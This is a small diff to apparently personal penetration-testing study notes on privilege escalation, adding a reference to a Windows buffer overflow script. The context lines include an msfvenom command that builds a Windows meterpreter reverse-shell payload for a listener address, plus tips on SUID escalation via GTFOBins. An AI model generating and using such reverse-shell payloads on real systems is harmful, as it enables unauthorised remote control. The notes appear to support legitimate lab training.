@@ -104,6 +104,7 @@ Privilege Escalation:
     - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.5 lport=5555 -b "\x00" -f python <- msfvenom syntax
     - THE BUFFER OVERFLOW SCRIPT IS ALREADY CREATED - just change ip and port
     - type shell in meterpreter to drop into a shell
+    - WINDOWS BUFFER OVERFLOW - winbuff.py
     - LINUX BUFFER OVERFLOW - bufferoverflow.sh 
   - SUID/SGID bits:
     - for all of these: for each file found, go on gtfobins and look through EACH FILE until you find the one you can escalate 
